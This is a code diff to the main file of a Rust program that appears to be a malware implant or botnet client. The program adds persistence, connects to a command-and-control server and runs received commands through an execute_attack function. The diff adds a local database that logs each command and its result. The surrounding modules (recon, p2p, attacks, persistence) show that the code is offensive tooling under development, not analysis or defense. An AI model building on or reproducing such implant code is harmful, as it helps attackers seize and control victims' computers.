@@ -12,8 +12,11 @@ mod utils;
 mod p2p;
 mod agentic;
 mod recon;
+mod compute;
+mod db;
 
 use config::FullConfig;
+use db::ClientDb;
 use communication::connect_to_c2;
 use persistence::add_persistence;
 use attacks::execute_attack;
@@ -25,6 +28,11 @@ use std::sync::Arc;
 fn main() {
     let config = FullConfig::load();
     add_persistence();
+
+    let db = Arc::new(
+        ClientDb::open(&config.database.path)
+            .unwrap_or_else(|_| ClientDb::open_memory().expect("in-memory db"))
+    );
 
     let rt = Runtime::new().unwrap();
     rt.block_on(async {
@@ -68,10 +76,14 @@ fn main() {
                         }
                     };
 
+                    let _ = db.insert_command(command.id, &command.command, &command.args);
+
                     let result_str = match execute_attack(&command).await {
                         Ok(data) => data,
                         Err(e) => format!("Error: {}", e),
                     };
+
+                    let _ = db.update_command_result(command.id, &result_str);
 
                     let result = CommandResult {
                         id: command.id,
